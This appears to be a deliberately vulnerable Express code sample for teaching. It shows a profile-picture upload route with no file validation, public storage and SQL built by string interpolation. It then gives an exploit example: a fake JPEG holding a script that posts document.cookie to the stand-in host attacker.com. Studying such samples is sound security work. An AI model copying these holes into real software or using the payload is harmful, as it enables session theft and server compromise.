/*-----------------------------------------------------------------------------
Upload File Vulnerability:
- Allows users to upload profile pictures without proper validation.
- Files are stored in a public directory, potentially allowing execution of malicious files.
- No checks on file type, size, or content.
- Uploaded file paths and names are stored in the database without sanitization.
-----------------------------------------------------------------------------*/
const UPLOAD_DIR = path.resolve(__dirname, "uploads");

// ensure upload directory exists
await fs.mkdir(UPLOAD_DIR, { recursive: true });
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, UPLOAD_DIR);
  },
});
const upload = multer({ storage: storage });

app.post(
  "/upload-profile-picture",
  authMiddleware,
  upload.single("profile_picture"),
  async (req, res) => {
    const user = req.user;
    if (!user) return res.status(401).json({ message: "Unauthorized" });

    const file = req.file;
    if (!file) return res.status(400).json({ message: "No file uploaded" });

    const fileName = file.filename;
    const filePath = path.join(UPLOAD_DIR, fileName);

    await fs.writeFile(filePath, file.buffer);

    // Save file path and file name to user's profile in DB
    await db.query(
      `UPDATE users SET profile_picture_path = '${filePath}', profile_picture_name = '${fileName}' WHERE id = ${user.userId}`
    );

    return res.status(200).json({ message: "File uploaded successfully" });
  }
);

/*-----------------------------------------------------------------------------
Upload File Exploit Example:
- An attacker uploads a malicious script disguised as a profile picture.
- The script is stored in the public uploads directory.
- The attacker then accesses the uploaded script via a direct URL, executing it on the server.
-----------------------------------------------------------------------------*/
const maliciousFile = new File(
  [
    `<script>fetch('http://attacker.com/steal', {
      method: 'POST',
      body: document.cookie + '\\n' + document.location,
   });
   </script>`,
  ],
  "malicious_profile_picture.jpg",
  { type: "image/jpeg" }
);
const formData = new FormData();
formData.append("profile_picture", maliciousFile);
fetch("/upload-profile-picture", {
  method: "POST",
  body: formData,
  credentials: "include", // include cookies for authentication
}).then((res) => {
  if (res.status === 200) {
    console.log("Malicious file uploaded successfully");
    // Attacker accesses the uploaded file
    window.open("/uploads/malicious_profile_picture.jpg");
  }
});
